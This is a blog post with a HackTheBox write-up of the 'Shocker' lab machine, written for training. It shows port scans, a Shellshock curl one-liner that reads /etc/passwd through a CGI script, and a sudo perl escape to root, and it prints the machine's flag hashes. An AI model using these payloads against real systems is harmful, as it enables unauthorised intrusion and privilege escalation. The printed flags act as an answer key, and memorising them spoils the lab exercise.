---
layout: post
title: "Shocker Writeup - HackTheBox"
category: HackTheBox
---
# HTB lab Machine - Shocker

I started of reverting the machine, and then ran my self made script https://github.com/yassirlaaouissi/EZEA. The exact results can be found in the results/10.129.1.175 folder that I have attached to this post.

## Enumeration summary

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).

2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

![image-20210505112113518](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210505112113518.png)

```
Summary   : HTML5, Apache[2.4.18], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)]
```

```
| http-php-version: Logo query returned unknown hash 1694158b3f7adc637066c13aed71a979
```

```
PORT      STATE         SERVICE
9/udp     open|filtered discard
19/udp    open|filtered chargen
68/udp    open|filtered dhcpc
500/udp   open|filtered isakmp
520/udp   open|filtered route
631/udp   open|filtered ipp
1030/udp  open|filtered iad1
1646/udp  open|filtered radacct
1813/udp  open|filtered radacct
2000/udp  open|filtered cisco-sccp
3283/udp  open|filtered netassistant
4500/udp  open|filtered nat-t-ike
5632/udp  open|filtered pcanywherestat
10000/udp open|filtered ndmp
30718/udp open|filtered unknown
31337/udp open|filtered BackOrifice
32769/udp open|filtered filenet-rpc
33281/udp open|filtered unknown
49200/udp open|filtered unknown

```

## Exploitation

The name of the box made me think of shellshock. Eventhough the enumeration did not point me towards it. So I ran this script to see if it was vulnerable to shellshock: https://github.com/nccgroup/shocker

But it could not find anything vulnerable. So I ran dirbuster:

```
php,asp,aspx,bat,c,cfm,cgi,com,dll,exe,htm,html,inc,jhtml,jsa,jsp,log,mdb,nsf,phtml,pl,reg,sh,shtml,sql,txt,xml,py

/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

Which made me find this: http://shocker.htb/cgi-bin/user.sh

And do the occasional shellshock oneliner:

```
kali@kali:~$ curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://shocker.htb/cgi-bin/user.sh

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
shelly:x:1000:1000:shelly,,,:/home/shelly:/bin/bash
```

Nice, we have RCE. Lets create a revese shell:

![image-20210506084326283](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210506084326283.png)

```
shelly@Shocker:/usr/lib/cgi-bin$ cd /home/shelly
cd /home/shelly
shelly@Shocker:/home/shelly$ dir
dir
user.txt
shelly@Shocker:/home/shelly$ cat user.txt
cat user.txt
5c97048c0061c3e47f3c6c2d3e554cb4
shelly@Shocker:/home/shelly$ 


```

Okay, now we need to get root. Well, privesc is a joke on this machine:

```
shelly@Shocker:/home/shelly$ sudo -l
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
shelly@Shocker:/home/shelly$ sudo perl -e 'exec "/bin/sh";'
sudo perl -e 'exec "/bin/sh";'
id
uid=0(root) gid=0(root) groups=0(root)
pwd
/home/shelly
cd /root
dir
root.txt
cat root.txt
0d7595c4e9c1b372463644eab937cd04

```

## Final thoughts

I had some problems with initial foothold, but privesc was a walk in the park. This is a 20 pointer on OSCP, but def an easy one.
